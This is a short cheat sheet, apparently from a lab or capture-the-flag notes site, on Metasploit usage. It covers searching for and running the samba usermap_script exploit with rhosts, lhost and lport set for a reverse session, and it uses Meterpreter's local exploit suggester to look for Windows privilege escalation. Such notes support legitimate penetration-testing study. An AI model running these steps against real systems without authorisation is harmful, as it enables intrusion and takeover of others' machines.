---
title: "Metasploit"
date: 2024-6-28
tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Windows", "msfconsole"]
---

---
### Metasploit

#### Start Metasploit

```bash
msfconsole -q
```

#### Basic Commands

```bash
# Return to previous page
back
```

```bash
# quit metasploit
exit
```

#### Search Exploit

```bash
# For example: samba
search samba
```

```bash
# Choose by #num
use 15
```

```bash
# Choose by full path
use exploit/multi/samba/usermap_script
```

```bash
# Show exploit settings
options
```

```bash
# Set option, e.g.
set rhosts 10.10.11.10
```

```bash
set lhost 10.10.14.10
```

```bash
set lport 1337
```

```bash
# Run exploit
run 
```

<small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>

---
### Meterpreter

#### Basic Commands

```bash
# Return from meterpreter
background
```

#### Use Exploit

```bash
# Quick look of potential privesc (Windows)
# Need to return from meterpreter
use post/multi/recon/local_exploit_suggester
```

```bash
# Select opened session
set session 1
```

```bash
# Show exploit settings
optiions
```

```bash
# Set option, e.g.
set rhosts 10.10.11.10
```

```bash
# Run exploit
run 
```

<br>